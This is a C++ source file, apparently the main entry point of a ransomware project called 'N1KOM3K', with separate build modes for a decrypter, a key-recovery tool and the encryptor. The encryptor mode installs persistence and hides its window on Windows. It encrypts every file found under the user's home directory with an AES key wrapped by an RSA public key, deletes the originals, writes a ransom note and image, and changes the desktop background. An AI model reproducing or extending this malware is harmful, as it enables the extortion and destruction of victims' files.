#include "config.h"
#include <iostream>
#include <vector>
#include <string>
#include <iostream>
#include <cstdlib>
#include <ctime>
#include <fstream>
#include <sstream>
#include "Persistance.h"
#include "Ransom.h"
#include "FileFinder.h"
#include "Arboresance.h"
#include "Crypter.h"
#ifdef LINUX
	#include <pwd.h>
	#include <unistd.h>
#else
	#include <Windows.h>
#endif
using namespace std;
#ifdef DECRYPTER
	int main(int argc, char const *argv[]){	
		Crypter crypter;
		string path;
		char key[64];
		cout<<"Write the file path that you want to decrypt"<<endl;
		cin>>path;
		cout<<"Write the decryption key"<<endl;
		cin>>key;
		crypter.decryptFile((char *)path.c_str(),(char *)path.c_str(),key);

		}
#endif
#ifdef KEYGEN
	int main(int argc, char const *argv[]){	
		if(argc<3){
			cout << "usage "<<argv[0]<<" [private key] [key to decrypt]"<<endl;
		}
		else{
			Crypter crypter;
			string aes((char *)argv[2]);
			string y=crypter.decryptAesKeyWithPrivateKey(aes,(char *)argv[1]);
			cout << "privateKey : " << (char *)argv[1]<<endl;
			cout << "cryptedAes : " << aes<<endl;
			cout <<"decryptedAes : "<<y<<endl;
		}
	}
#endif
#ifdef CRYPTER		
	int main(int argc, char const *argv[]){	
#ifdef LINUX
		
		char homePath[1024];
		char encryptedPath[1024];
		char keysDir[1024];
		char ransomDir[1024];
		char bypass[1024]; //NOT USED BUT BYPASS ERROR
		strcpy(homePath,getpwuid(getuid())->pw_dir);
		strcpy(ransomDir,getpwuid(getuid())->pw_dir);
		strcpy(encryptedPath,getpwuid(getuid())->pw_dir);
		strcpy(keysDir,getpwuid(getuid())->pw_dir);
		strcat(encryptedPath,"/N1KOM3K_ENCRYPTED_FILES/");
		strcat(keysDir,"/N1KOM3K_KEYS/");
		string homePathString(homePath);
		char key[64];
		vector<string> files;
		const char* execName = argv[0];
		Persistance persistance;
		persistance.persist(execName);
		Ransom ransom;
		Crypter crypter;
		strcpy(key, crypter.generateKey());
		string stringKey(key);
		string cryptedKey = crypter.encryptAesKeyWithPublicKey(stringKey);
		char *charCryptedKey = new char[cryptedKey.length() + 1];
		strcpy(charCryptedKey, cryptedKey.c_str());
		FileFinder fileFinder(homePathString);
		Arboresance arboresance;
		arboresance.createArboresance(encryptedPath, keysDir);
		ransom.generateKeyFile(charCryptedKey, keysDir);
		ransom.generateRansomMessage(ransomDir);
		ransom.generateRansomPicture(ransomDir);
		ransom.changeBackgroundImage(ransomDir);
		files = fileFinder.getFiles();
		for (int i = 0; i < files.size(); i++) {
			char *filename = new char[files[i].length() + 1];
			strcpy(filename, files[i].c_str());
			crypter.encryptFile(filename, encryptedPath, key);
			remove(filename);
		}
		if (files.size() == 0) {
			persistance.removePersistance();
		}
		for (int i = 0; i < 64; i++)
		{
			key[i] = '0';
			stringKey[i] = '0';
		}
		return 0;
	}
#else
		::ShowWindow(::GetConsoleWindow(), SW_HIDE);
		char homePath[1024];
		char encryptedPath[1024];
		char keysDir[1024];
		char ransomDir[1024];
		char bypass[1024]; //NOT USED BUT BYPASS ERROR
		
		strcpy(homePath,getenv("HOMEPATH"));
		strcpy(ransomDir,getenv("HOMEPATH"));
		strcpy(encryptedPath,getenv("HOMEPATH"));
		strcpy(keysDir,getenv("HOMEPATH"));
		strcat(encryptedPath,"/N1KOM3K_ENCRYPTED_FILES/");
		strcat(keysDir,"/N1KOM3K_KEYS/");
		string homePathString(homePath);
		char key[65];
		vector<string> files;
		const char* execName = argv[0];
		Persistance persistance;
		persistance.persist(execName);
		Ransom ransom;
		Crypter crypter;
		strcpy(key, crypter.generateKey());
		key[64]= '\0';
		string stringKey(key);
		string cryptedKey = crypter.encryptAesKeyWithPublicKey(stringKey);
		char *charCryptedKey = new char[cryptedKey.length() + 1];
		strcpy(charCryptedKey, cryptedKey.c_str());
		FileFinder fileFinder(homePathString);
		Arboresance arboresance;
		arboresance.createArboresance(encryptedPath, keysDir);
		ransom.generateKeyFile(charCryptedKey, keysDir);
		ransom.generateRansomMessage(ransomDir);
		ransom.generateRansomPicture(ransomDir);
		ransom.changeBackgroundImage(ransomDir);
		files = fileFinder.getFiles();
		for (int i = 0; i < files.size(); i++) {
			char *filename = new char[files[i].length() + 1];
			strcpy(filename, files[i].c_str());
			crypter.encryptFile(filename, encryptedPath, key);
			remove(filename);
		}
		if (files.size() == 0) {
			persistance.removePersistance();
		}
		for (int i = 0; i < 64; i++)
		{
			key[i] = '0';
			stringKey[i] = '0';
		}
		return 0;
	}
#endif 
	
#endif
